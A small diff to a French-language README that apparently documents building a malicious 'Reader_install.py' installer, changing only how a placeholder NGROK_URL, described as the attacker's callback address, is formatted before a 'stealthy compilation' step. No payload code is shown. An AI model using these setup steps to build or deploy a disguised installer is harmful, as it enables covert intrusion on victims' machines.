@@ -67,7 +67,7 @@ Prérequis de Compilation :
 Configuration de l'URL :
 Ouvrez le fichier Reader_install.py et modifiez la variable NGROK_URL avec l'adresse fournie par l'attaquant à l'étape précédente :
 
-`NGROK_URL = "[https://votre-url-dynamique.ngrok-free.app](https://votre-url-dynamique.ngrok-free.app)"`
+`NGROK_URL = "[https://votre-url-dynamique.ngrok-free.app]"`
 
 
 Compilation Furtive :
